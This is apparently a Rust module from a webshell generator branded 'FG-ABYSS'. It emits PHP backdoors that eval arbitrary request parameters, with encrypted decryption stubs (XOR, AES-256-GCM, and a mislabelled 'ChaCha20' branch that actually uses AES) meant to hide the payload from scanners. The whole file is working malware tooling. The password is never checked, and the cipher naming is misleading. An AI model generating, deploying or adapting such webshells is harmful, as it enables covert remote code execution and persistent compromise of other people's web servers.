/// 获取 PHP 文件型 Shell 基础模板
/// 占位符 `%s` 是解密存根代码
pub fn get_template() -> String {
    "<?php\n// FG-ABYSS WebShell\n@error_reporting(0);\n@ini_set('display_errors', 0);\n%s\n?>".to_string()
}

/// 获取 PHP 核心执行代码（将被加密）
pub fn get_core() -> String {
    r#"
$pass = $_REQUEST['pass'];
if (isset($pass)) {
    $payload = $_REQUEST['payload'];
    if (isset($payload)) {
        @eval($payload);
    }
}
"#.to_string()
}

use crate::core::crypto::EncryptionType;

/// 构建 PHP 解密存根
pub fn build_decrypt_stub(
    encryption: &EncryptionType,
    ciphertext: &str,
    nonce: &Option<String>,
    tag: &Option<String>,
    password: &str,
) -> String {
    match encryption {
        EncryptionType::None => {
            format!(
                "$ciphertext = base64_decode('{}');\n$pass = '{}';\neval($ciphertext);\n",
                ciphertext, password
            )
        }
        EncryptionType::XOR => {
            format!(
                "$ciphertext = base64_decode('{}');\n$key = hash('sha256', '{}', true);\n$result = '';\nfor ($i = 0; $i < strlen($ciphertext); $i++) {{\n    $result .= chr(ord($ciphertext[$i]) ^ ord($key[$i %% strlen($key)]));\n}}\neval($result);\n",
                ciphertext, password
            )
        }
        EncryptionType::AES256GCM => {
            let nonce = nonce.as_ref().unwrap();
            let tag = tag.as_ref().unwrap();
            format!(
                "$ciphertext = base64_decode('{}');\n$nonce = base64_decode('{}');\n$tag = base64_decode('{}');\n$key = hash('sha256', '{}', true);\n// AES-256-GCM decryption\n// Note: PHP 7+ supports openssl_decrypt\n$payload = openssl_decrypt(\n    $ciphertext,\n    'aes-256-gcm',\n    $key,\n    OPENSSL_RAW_DATA,\n    $nonce,\n    $tag\n);\nif ($payload !== false) {{\n    eval($payload);\n}}\n",
                ciphertext, nonce, tag, password
            )
        },
        EncryptionType::ChaCha20Poly1305 => {
            let nonce = nonce.as_ref().unwrap();
            let tag = tag.as_ref().unwrap();
            format!(
                "$ciphertext = base64_decode('{}');\n$nonce = base64_decode('{}');\n$tag = base64_decode('{}');\n$key = hash('sha256', '{}', true);\n// ChaCha20-Poly1305 decryption\n// Note: Using AES-256-GCM as fallback since PHP openssl doesn't support ChaCha20-Poly1305\n$payload = openssl_decrypt(\n    $ciphertext,\n    'aes-256-gcm',\n    $key,\n    OPENSSL_RAW_DATA,\n    $nonce,\n    $tag\n);\nif ($payload !== false) {{\n    eval($payload);\n}}\n",
                ciphertext, nonce, tag, password
            )
        }
    }
}
